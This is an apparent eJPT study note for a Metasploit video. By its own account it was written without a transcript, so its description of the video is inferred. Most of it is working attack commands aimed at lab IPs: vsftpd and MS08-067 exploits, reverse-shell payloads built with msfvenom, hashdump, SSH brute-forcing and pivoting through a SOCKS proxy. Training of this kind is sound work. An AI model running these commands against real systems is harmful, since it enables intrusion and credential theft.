# 05 - Penetration Testing With The Metasploit Framework

Note: No transcript was provided. The following summary is inferred conservatively from the filename and folder context (01-MetasploitFrameworkOverview) and reflects a standard eJPT-aligned workflow with the Metasploit Framework.

## What the video covers (Introduction / big picture)
- Where Metasploit fits in a penetration testing workflow: reconnaissance, vulnerability validation, exploitation, and post-exploitation.
- Using msfconsole efficiently: searching modules, setting options, global variables, running jobs, managing sessions.
- Database-backed workflows (db_nmap, hosts, services) to keep findings structured.
- Typical exploitation flows against common lab targets (e.g., FTP backdoor, SMB MS08-067).
- Meterpreter basics: session management, privilege escalation attempts, data collection, pivoting, and using socks proxy.
- Generating payloads with msfvenom and catching them with multi/handler.

## Flow (ordered)
1. Prepare environment and database.
2. Launch msfconsole and create a workspace.
3. Discover targets (db_nmap) and review hosts/services.
4. Use auxiliary scanners/validators to confirm versions/credentials.
5. Select a matching exploit, set payload and options, then run.
6. Gain and manage a session (meterpreter/shell).
7. Post-exploitation: enumerate, dump credentials (if permitted), collect files, migrate, persistence (lab).
8. Optional: Pivot into internal subnets (autoroute + socks_proxy).
9. Use msfvenom + multi/handler for delivered payloads.
10. Organize output/loot and clean up.

## Tools highlighted
- msfconsole (core Metasploit CLI)
- msfdb / PostgreSQL integration
- db_nmap (Nmap through Metasploit DB)
- Auxiliary scanners: smb_version, smb_login, ftp_anonymous, port scanners
- Exploit modules: exploit/unix/ftp/vsftpd_234_backdoor, exploit/windows/smb/ms08_067_netapi, exploit/multi/handler
- Meterpreter and post modules: post/multi/recon/local_exploit_suggester, post/multi/manage/autoroute
- auxiliary/server/socks_proxy for pivoting
- msfvenom for payload generation

## Typical command walkthrough (detailed, copy-paste friendly)

Environment prep (Kali-like)
```
# Ensure DB is ready (Kali)
sudo systemctl enable --now postgresql
msfdb init

# Optional: update Nmap scripts and MSF modules if needed
sudo nmap --script-updatedb || true
```

Start Metasploit and set up workspace/logging
```
msfconsole -q

# Keep findings separated per target
workspace -a lab01
workspace lab01

# Optional: log everything to a file
spool msf_lab01.log
```

Discover targets with db_nmap
```
# Adjust CIDR/subnet to your lab
db_nmap -sS -sV -O -Pn -T4 -p- 10.10.10.0/24

# Review results
hosts
services
services -c host,port,name,info -u
```

Set global variables (helps avoid repetition)
```
# Set your VPN/attack IP automatically (tun0 typical for eJPT VPNs)
setg LHOST `ip -4 addr show tun0 | awk '/inet/ {print $2}' | cut -d/ -f1`
setg VERBOSE true
```

Quick validation with auxiliary scanners
```
# SMB version enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.10
run
back

# FTP anonymous check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 10.10.10.10
run
back

# TCP port scan (Metasploit-side)
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.10
set PORTS 1-1000
set THREADS 50
run
back
```

Exploit example (Linux: vsftpd 2.3.4 backdoor – Metasploitable2-style)
```
search type:exploit name:vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.10.10.11
set RPORT 21
# This module usually drops a shell automatically
run

# If you get a command shell
sessions
sessions -i 1
id; uname -a
# Background for later
background
```

Exploit example (Windows: MS08-067 – if applicable in your lab)
```
# Validate SMB first
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.12
run
back

# Search and configure exploit
search type:exploit name:ms08_067
use exploit/windows/smb/ms08_067_netapi
show targets
set RHOSTS 10.10.10.12
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT 4444
check      # If supported, confirms likely vulnerability
exploit -j # Run in background as a job

# Manage session
sessions
sessions -i 1
sysinfo
getuid
# If unstable, find a stable process and migrate
ps
migrate <PID>
```

Post-exploitation essentials (Meterpreter)
```
# Inside meterpreter
getuid
sysinfo
ipconfig
pwd
ls
search -f *flag*  # Or lab-specific target files
hashdump           # Requires SYSTEM/privs on Windows
getprivs
getsystem          # Try privilege escalation (Windows)
shell              # Drop to a system shell if needed
background
```

Automatic local exploit suggestion (post-exploitation)
```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Pivoting with autoroute + socks proxy
```
# From a meterpreter session on a host that sees 10.10.20.0/24
sessions -i 1
run post/multi/manage/autoroute SUBNET=10.10.20.0 NETMASK=255.255.255.0
background

# Provide SOCKS5 for external tools (e.g., proxychains)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# On the host OS: add to ProxyChains
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# Now scan/poke internal hosts via proxychains (TCP connect scans)
proxychains nmap -sT -Pn -n -p 80,445 10.10.20.10
```

Credential brute-force example (if permitted in lab rules)
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.13
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/10-million-password-list-top-10000.txt
set STOP_ON_SUCCESS true
set THREADS 10
run
```

Generate a payload and catch it (msfvenom + multi/handler)
```
# Windows x64 Meterpreter over HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -f exe -o payload.exe

# Listener
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST ${LHOST}
set LPORT 443
set ExitOnSession false
exploit -j
```

Loot and cleanup
```
# View stored loot/notes
loot
notes
# Location of loot on disk (Kali): ~/.msf4/loot

# Stop logging
spool off

# Close everything
sessions -K
jobs -l
jobs -k all
exit -y
```

## Practical tips
- Always set LHOST to your reachable interface (often tun0 in eJPT labs). Many failed shells are just LHOST mistakes.
- Use setg to store LHOST/RPORT/etc. once per msfconsole session.
- Use check when available to validate vulnerabilities before firing an exploit.
- Prefer exploit -j to keep the listener running; combine with set ExitOnSession false for multiple callbacks.
- Migrate Meterpreter into a stable, long-lived process (e.g., services) before heavy post-exploitation.
- Use workspaces and spool to keep findings and logs organized across targets.
- db_nmap is convenient; still keep a normal Nmap handy for fine-tuned scans outside MSF.
- For pivoting, Metasploit modules honor route entries; socks_proxy enables external tools via proxychains.
- Respect lab scope and rules; only use brute-force where explicitly allowed.

## Minimal cheat sheet (one-screen flow)
```
# Start
sudo systemctl enable --now postgresql
msfdb init
msfconsole -q
workspace -a lab01
spool msf_lab01.log
setg LHOST `ip -4 addr show tun0 | awk '/inet/ {print $2}' | cut -d/ -f1`

# Discover
db_nmap -sS -sV -O -Pn -T4 -p- 10.10.10.0/24
hosts; services

# Validate
use auxiliary/scanner/smb/smb_version; set RHOSTS 10.10.10.10; run; back
use auxiliary/scanner/ftp/anonymous; set RHOSTS 10.10.10.11; run; back

# Exploit (example)
search name:vsftpd type:exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.11
run
sessions -i 1

# Windows example
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.12
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ${LHOST}; set LPORT 4444
exploit -j
sessions -i 1

# Post
getuid; sysinfo; ipconfig; search -f *flag*; background
use post/multi/recon/local_exploit_suggester; set SESSION 1; run

# Pivot
sessions -i 1
run post/multi/manage/autoroute SUBNET=10.10.20.0 NETMASK=255.255.255.0
background
use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; set VERSION 5; run -j
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains nmap -sT -Pn -n -p 80 10.10.20.10

# Handler/payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -f exe -o payload.exe
use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ${LHOST}; set LPORT 443; set ExitOnSession false; exploit -j

# Wrap-up
loot; notes; spool off; sessions -K; jobs -k all; exit -y
```

## Summary
This video likely demonstrates an end-to-end, lab-focused workflow with the Metasploit Framework: organizing work in msfconsole, using the database to structure reconnaissance results, validating services with auxiliary modules, selecting and configuring exploits/payloads, and operating Meterpreter for post-exploitation. It probably includes common lab examples (vsftpd 2.3.4, MS08-067), quick credential checks/bruteforce, and pivoting techniques (autoroute + socks proxy). The commands above provide a copy-paste friendly baseline you can adapt to typical eJPT environments.